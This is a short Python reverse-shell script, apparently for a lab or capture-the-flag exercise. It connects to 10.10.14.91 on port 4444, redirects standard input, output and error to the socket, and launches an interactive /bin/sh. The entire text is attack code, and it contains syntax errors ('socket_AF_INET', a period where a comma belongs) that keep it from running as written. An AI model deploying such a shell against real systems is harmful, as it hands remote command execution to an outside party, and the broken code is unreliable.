#!/usr/bin/python

import socket, subprocess, os

s=socket.socket(socket_AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.91", 4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh"."-i"])
